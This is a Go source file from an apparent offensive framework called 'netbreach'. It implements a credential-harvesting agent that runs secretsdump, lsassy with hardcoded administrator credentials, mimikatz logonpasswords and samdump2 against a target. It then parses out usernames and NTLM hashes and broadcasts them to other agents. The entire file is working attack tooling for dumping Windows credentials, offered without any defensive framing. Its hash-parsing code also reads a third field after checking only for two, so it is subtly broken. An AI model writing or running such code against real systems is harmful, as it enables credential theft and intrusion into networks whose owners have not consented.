// EXTRACT — Credential Harvesting & Dumping Agent
// mimikatz, laZagne, secretsdump, lsassy

package netbreach

import (
	"fmt"
	"os/exec"
	"strings"
)

// ExtractAgent handles credential extraction
type ExtractAgent struct {
	bus    *EventBus
	state  *SharedState
	stopCh chan struct{}
	msgCh  chan AgentMessage
}

func NewExtractAgent(bus *EventBus, state *SharedState) *ExtractAgent {
	return &ExtractAgent{bus: bus, state: state, stopCh: make(chan struct{}), msgCh: make(chan AgentMessage, 100)}
}

func (a *ExtractAgent) Name() string  { return "EXTRACT" }
func (a *ExtractAgent) Status() string { return "online" }

func (a *ExtractAgent) Start() {
	a.bus.Subscribe("EXTRACT", a.msgCh)
	for {
		select {
		case msg := <-a.msgCh:
			a.Handle(msg)
		case <-a.stopCh:
			return
		}
	}
}

func (a *ExtractAgent) Stop() { close(a.stopCh) }

func (a *ExtractAgent) Handle(msg AgentMessage) {
	switch msg.Type {
	case "EXTRACT":
		a.extractCreds(msg.Data)
	case "CREDS_FOUND":
		a.dumpCreds(msg.Data)
	}
}

func (a *ExtractAgent) broadcast(msg string) {
	a.bus.Broadcast(AgentMessage{From: "EXTRACT", To: "ALL", Type: "LOG", Data: msg})
}

func (a *ExtractAgent) extractCreds(target string) {
	a.broadcast(fmt.Sprintf("[EXTRACT] Credential extraction on: %s", target))
	a.dumpCreds(target)
	a.lsassDump(target)
	a.samDump(target)
}

func (a *ExtractAgent) dumpCreds(target string) {
	// secretsdump.py via impacket
	if out, err := exec.Command("secretsdump.py", target).CombinedOutput(); err == nil {
		output := string(out)
		a.broadcast("[EXTRACT] secretsdump complete")
		for _, line := range strings.Split(output, "\n") {
			if strings.Contains(line, ":") && len(line) > 10 {
				cred := Credential{
					Source: target,
					Type:   "ntlm",
				}
				parts := strings.Split(line, ":")
				if len(parts) >= 2 {
					cred.Username = parts[0]
					cred.Hash = parts[2]
				}
				a.state.mu.Lock()
				a.state.Creds = append(a.state.Creds, cred)
				a.state.mu.Unlock()
				a.broadcast(fmt.Sprintf("[CRED] %s", line))
			}
		}
	} else {
		_ = out
	}
}

func (a *ExtractAgent) lsassDump(target string) {
	// lsassy remote LSASS dump
	if out, err := exec.Command("lsassy", "-d", target, "-u", "administrator", "-p", "password").CombinedOutput(); err == nil {
		output := string(out)
		if strings.Contains(output, "NTLM") {
			a.broadcast("[CRITICAL] LSASS dump successful - NTLM hashes extracted!")
		}
		_ = output
	}

	// mimikatz sekurlsa::logonpasswords
	if out, err := exec.Command("mimikatz", `"sekurlsa::logonpasswords"`, `"exit"`).CombinedOutput(); err == nil {
		output := string(out)
		if strings.Contains(output, "Username") {
			a.broadcast("[EXTRACT] mimikatz credential dump complete")
		}
		_ = output
	}
}

func (a *ExtractAgent) samDump(target string) {
	if out, err := exec.Command("samdump2", target).CombinedOutput(); err == nil {
		output := string(out)
		for _, line := range strings.Split(output, "\n") {
			if strings.Contains(line, "Administrator") || strings.Contains(line, "500:") {
				a.broadcast(fmt.Sprintf("[EXTRACT] SAM: %s", line))
			}
		}
		_ = output
	}
}
